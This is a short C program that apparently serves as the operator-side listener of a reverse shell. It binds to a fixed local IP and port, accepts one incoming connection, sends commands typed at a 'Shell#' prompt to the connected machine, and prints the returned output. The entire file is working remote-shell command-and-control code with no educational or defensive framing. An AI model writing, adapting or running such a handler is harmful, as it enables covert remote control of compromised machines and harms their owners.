#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


int main()
{
	int sock, client_sock;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_addr, client_addr;
	int i=0;
	int optval = 1;
	socklen_t client_len;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		printf("Error setting TCP socket options!\n");
		return 1;
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr("192.168.0.102");
	server_addr.sin_port = htons(50005);

	if(bind(sock, (struct sockaddr*) &server_addr, sizeof(server_addr)) < 0)
	{
		printf("Error in binding\n");
	}
	else
	{
		printf("Success in binding\n");
	}
	listen(sock, 5);
	client_len = sizeof(client_addr);
	client_sock = accept(sock, (struct sockaddr*) &client_addr, &client_len);

	if(client_sock < 0)
	{
		printf("Error in accept\n");
	}
	else
	{
		printf("Success in accept\n");
	}

	while(1)
	{
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s˜$: ", inet_ntoa(client_addr.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");
		write(client_sock, buffer, sizeof(buffer));
		if(strncmp("q", buffer, 1) == 0)
		{
			break;
		}
		else
		{
			recv(client_sock, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
	}
}
